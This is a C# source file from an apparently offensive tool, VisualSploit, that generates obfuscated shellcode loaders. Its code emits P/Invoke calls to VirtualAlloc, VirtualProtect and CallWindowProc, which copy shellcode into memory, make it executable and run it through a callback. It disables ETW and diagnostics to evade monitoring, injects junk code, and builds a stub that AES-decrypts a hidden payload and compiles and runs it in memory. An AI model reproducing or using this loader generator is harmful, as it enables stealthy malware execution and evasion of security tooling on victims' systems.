using System.Text;

namespace VisualSploit.Obfuscation;

internal static class Bypass
{
    public static string GenerateCode(string indent)
    {
        var sb = new StringBuilder();
        sb.AppendLine($"{indent}System.Environment.SetEnvironmentVariable(\"COMPlus_EnableDiagnostics\", \"0\");");
        sb.AppendLine($"{indent}System.Environment.SetEnvironmentVariable(\"COMPlus_ETWEnabled\", \"0\");");
        sb.AppendLine();
        return sb.ToString();
    }
}

internal static class CodeGenerator
{
    private const string Indent = "                  ";
    private const uint PageMask = 4095u; // 4KB page size - 1 (0xFFF)

    public static string Generate(ObfuscatedPayload payload, ObfuscationConfig config, Random random, NameGenerator nameGen)
    {
        var vars = payload.Variables;
        var sb = new StringBuilder();

        sb.Append(GeneratePInvokeDeclarations(vars));
        AppendJunkCode(sb, config, random, nameGen);
        sb.Append(GenerateShellcode(payload, config, vars));
        sb.Append(GenerateMemoryAllocation(config, vars, random));
        AppendJunkCode(sb, config, random, nameGen);
        sb.Append(GenerateMemoryProtection(config, vars, random));
        sb.Append(GenerateCallbackExecution(vars));

        return sb.ToString();
    }

    private static void AppendJunkCode(StringBuilder sb, ObfuscationConfig config, Random random, NameGenerator nameGen)
    {
        if (config.HasMethod(ObfuscationMethods.JunkCodeInjection))
        {
            var count = random.Next(1, 4);
            sb.Append(JunkCodeInjector.Generate(nameGen, random, count));
            sb.AppendLine();
        }
    }

    private static string GenerateShellcode(ObfuscatedPayload payload, ObfuscationConfig config, Dictionary<string, string> vars)
    {
        var sb = new StringBuilder();
        if (config.HasMethod(ObfuscationMethods.ShellcodeEncryption))
        {
            sb.Append(payload.DecryptionCode);
        }
        else
        {
            var shellcodeBytes = string.Join(", ", payload.EncryptedShellcode.Select(b => $"0x{b:X2}"));
            sb.AppendLine($"{Indent}var {vars["shellcode"]} = new byte[] {{ {shellcodeBytes} }};");
        }
        sb.AppendLine();
        return sb.ToString();
    }

    private static string GeneratePInvokeDeclarations(Dictionary<string, string> vars)
    {
        var sb = new StringBuilder();
        var allocMethodName = vars["VirtualAlloc"];
        var protectMethodName = vars["VirtualProtect"];
        var callWindowProcName = vars["CallWindowProc"];

        sb.AppendLine($"{Indent}[System.Runtime.InteropServices.DllImport(\"kernel32.dll\", SetLastError = true)]");
        sb.AppendLine($"{Indent}static extern System.IntPtr {allocMethodName}(System.IntPtr addr, uint size, uint allocType, uint protect);");
        sb.AppendLine();

        sb.AppendLine($"{Indent}[System.Runtime.InteropServices.DllImport(\"kernel32.dll\", SetLastError = true)]");
        sb.AppendLine($"{Indent}static extern bool {protectMethodName}(System.IntPtr addr, uint size, uint newProtect, out uint oldProtect);");
        sb.AppendLine();

        sb.AppendLine($"{Indent}[System.Runtime.InteropServices.DllImport(\"user32.dll\", SetLastError = true)]");
        sb.AppendLine($"{Indent}static extern System.IntPtr {callWindowProcName}(System.IntPtr lpPrevWndFunc, System.IntPtr hWnd, uint Msg, System.IntPtr wParam, System.IntPtr lParam);");
        sb.AppendLine();
        return sb.ToString();
    }

    private static string GenerateMemoryAllocation(ObfuscationConfig config, Dictionary<string, string> vars, Random random)
    {
        var sb = new StringBuilder();
        var shellcodeVar = config.HasMethod(ObfuscationMethods.ShellcodeEncryption) ? vars["encrypted"] : vars["shellcode"];
        var memoryVar = vars["memory"];
        var allocMethod = vars["VirtualAlloc"];

        // VirtualAlloc returns IntPtr.Zero on failure (insufficient memory, invalid params)
        var sizeVar = vars["allocSize"];
        sb.AppendLine($"{Indent}var {sizeVar} = ((uint){shellcodeVar}.Length + {PageMask}u) & ~{PageMask}u;");
        sb.AppendLine($"{Indent}var {memoryVar} = {allocMethod}(System.IntPtr.Zero, {sizeVar}, 0x1000u, 0x04u);"); // MEM_COMMIT | PAGE_READWRITE
        sb.AppendLine($"{Indent}System.Runtime.InteropServices.Marshal.Copy({shellcodeVar}, 0, {memoryVar}, {shellcodeVar}.Length);");
        sb.AppendLine();
        return sb.ToString();
    }

    private static string GenerateMemoryProtection(ObfuscationConfig config, Dictionary<string, string> vars, Random random)
    {
        var sb = new StringBuilder();
        var memoryVar = vars["memory"];
        var sizeVar = vars["allocSize"];
        var protectMethod = vars["VirtualProtect"];

        // VirtualProtect returns false on failure (invalid address, protection flags)
        sb.AppendLine($"{Indent}{protectMethod}({memoryVar}, {sizeVar}, 0x20u, out _);"); // PAGE_EXECUTE_READ
        sb.AppendLine();
        return sb.ToString();
    }

    private static string GenerateCallbackExecution(Dictionary<string, string> vars)
    {
        var sb = new StringBuilder();
        var memoryVar = vars["memory"];
        var callWindowProcName = vars["CallWindowProc"];

        sb.AppendLine($"{Indent}{callWindowProcName}({memoryVar}, System.IntPtr.Zero, 0, System.IntPtr.Zero, System.IntPtr.Zero);");
        return sb.ToString();
    }
}

internal static class Stub
{
    private const string Indent = "                  ";

    public static string Generate(string encrypted, byte[] iv, ObfuscationConfig config, Random random)
    {
        var vars = config.VariableNames ?? StubVars.Default;
        var sb = new StringBuilder();

        sb.Append(Bypass.GenerateCode(Indent));
        sb.AppendLine($"{Indent}var {vars["enc"]} = \"{encrypted}\";");
        sb.AppendLine($"{Indent}var {vars["iv"]} = new byte[] {{ {string.Join(", ", iv.Select(b => $"0x{b:X2}"))} }};");
        sb.AppendLine();
        sb.Append(GenerateKeyDerivation(vars));
        sb.Append(GenerateDecryption(vars));
        sb.Append(GenerateExecution(vars));

        return sb.ToString();
    }

    private static string GenerateKeyDerivation(Dictionary<string, string> vars)
    {
        var sb = new StringBuilder();
        // Static salt - MUST match Crypto.Aes256.DeriveKey()
        sb.AppendLine($"{Indent}var {vars["salt"]} = System.Text.Encoding.UTF8.GetBytes(\"VisualSploit.Obfuscation.Salt.v1\");");
        sb.AppendLine();
        sb.AppendLine($"{Indent}byte[] {vars["key"]};");
        sb.AppendLine($"{Indent}using (var pbkdf2 = new System.Security.Cryptography.Rfc2898DeriveBytes(");
        sb.AppendLine($"{Indent}    System.Text.Encoding.UTF8.GetBytes(\"AppConfig\"),");
        sb.AppendLine($"{Indent}    {vars["salt"]},");
        sb.AppendLine($"{Indent}    100000))");
        sb.AppendLine($"{Indent}{{");
        sb.AppendLine($"{Indent}    {vars["key"]} = pbkdf2.GetBytes(32);");
        sb.AppendLine($"{Indent}}}");
        sb.AppendLine();
        return sb.ToString();
    }

    private static string GenerateDecryption(Dictionary<string, string> vars)
    {
        var sb = new StringBuilder();
        sb.AppendLine($"{Indent}string Deserialize(string data, byte[] nonce, byte[] key)");
        sb.AppendLine($"{Indent}{{");
        sb.AppendLine($"{Indent}    var encrypted = System.Convert.FromBase64String(data);");
        sb.AppendLine($"{Indent}    using (var aes = System.Security.Cryptography.Aes.Create())");
        sb.AppendLine($"{Indent}    {{");
        sb.AppendLine($"{Indent}        aes.KeySize = 256;");
        sb.AppendLine($"{Indent}        aes.Key = key;");
        sb.AppendLine($"{Indent}        aes.IV = nonce;");
        sb.AppendLine($"{Indent}        aes.Mode = System.Security.Cryptography.CipherMode.CBC;");
        sb.AppendLine($"{Indent}        aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;");
        sb.AppendLine($"{Indent}        using (var decryptor = aes.CreateDecryptor())");
        sb.AppendLine($"{Indent}        using (var ms = new System.IO.MemoryStream(encrypted))");
        sb.AppendLine($"{Indent}        using (var cs = new System.Security.Cryptography.CryptoStream(ms, decryptor, System.Security.Cryptography.CryptoStreamMode.Read))");
        sb.AppendLine($"{Indent}        using (var sr = new System.IO.StreamReader(cs))");
        sb.AppendLine($"{Indent}        {{");
        sb.AppendLine($"{Indent}            return sr.ReadToEnd();");
        sb.AppendLine($"{Indent}        }}");
        sb.AppendLine($"{Indent}    }}");
        sb.AppendLine($"{Indent}}}");
        sb.AppendLine();
        sb.AppendLine($"{Indent}var {vars["code"]} = Deserialize({vars["enc"]}, {vars["iv"]}, {vars["key"]});");
        sb.AppendLine();
        return sb.ToString();
    }

    private static string GenerateExecution(Dictionary<string, string> vars)
    {
        var sb = new StringBuilder();

        // Load assemblies via reflection to avoid compile-time reference issues
        sb.AppendLine($"{Indent}var csharpAsm = System.Reflection.Assembly.Load(\"Microsoft.CSharp, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\");");
        sb.AppendLine($"{Indent}var providerType = csharpAsm.GetType(\"Microsoft.CSharp.CSharpCodeProvider\");");
        sb.AppendLine($"{Indent}var {vars["provider"]} = System.Activator.CreateInstance(providerType);");
        sb.AppendLine($"{Indent}try");
        sb.AppendLine($"{Indent}{{");

        // Create CompilerParameters via Type.GetType with assembly-qualified name
        sb.AppendLine($"{Indent}    var paramsType = System.Type.GetType(\"System.CodeDom.Compiler.CompilerParameters, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\");");
        sb.AppendLine($"{Indent}    var {vars["compiler"]} = System.Activator.CreateInstance(paramsType);");
        sb.AppendLine($"{Indent}    paramsType.GetProperty(\"GenerateInMemory\").SetValue({vars["compiler"]}, true);");

        // Add referenced assemblies via reflection
        sb.AppendLine($"{Indent}    var refs = paramsType.GetProperty(\"ReferencedAssemblies\").GetValue({vars["compiler"]});");
        sb.AppendLine($"{Indent}    var addMethod = refs.GetType().GetMethod(\"Add\", new[] {{ typeof(string) }});");
        sb.AppendLine($"{Indent}    addMethod.Invoke(refs, new object[] {{ \"System.dll\" }});");
        sb.AppendLine($"{Indent}    addMethod.Invoke(refs, new object[] {{ \"System.Core.dll\" }});");

        // CompileAssemblyFromSource may fail (syntax errors, missing references, runtime version mismatch)
        sb.AppendLine($"{Indent}    var compileMethod = providerType.GetMethod(\"CompileAssemblyFromSource\");");
        sb.AppendLine($"{Indent}    var {vars["result"]} = compileMethod.Invoke({vars["provider"]}, new object[] {{ {vars["compiler"]}, new string[] {{ {vars["code"]} }} }});");
        sb.AppendLine($"{Indent}    var {vars["assembly"]} = (System.Reflection.Assembly){vars["result"]}.GetType().GetProperty(\"CompiledAssembly\").GetValue({vars["result"]});");
        sb.AppendLine($"{Indent}    var {vars["type"]} = {vars["assembly"]}.GetType(\"ConfigLoader\");");
        sb.AppendLine($"{Indent}    var {vars["method"]} = {vars["type"]}.GetMethod(\"Load\", System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.Public);");
        sb.AppendLine($"{Indent}    {vars["method"]}?.Invoke(null, null);");

        sb.AppendLine($"{Indent}}}");
        sb.AppendLine($"{Indent}finally");
        sb.AppendLine($"{Indent}{{");
        sb.AppendLine($"{Indent}    ((System.IDisposable){vars["provider"]}).Dispose();");
        sb.AppendLine($"{Indent}}}");

        return sb.ToString();
    }
}
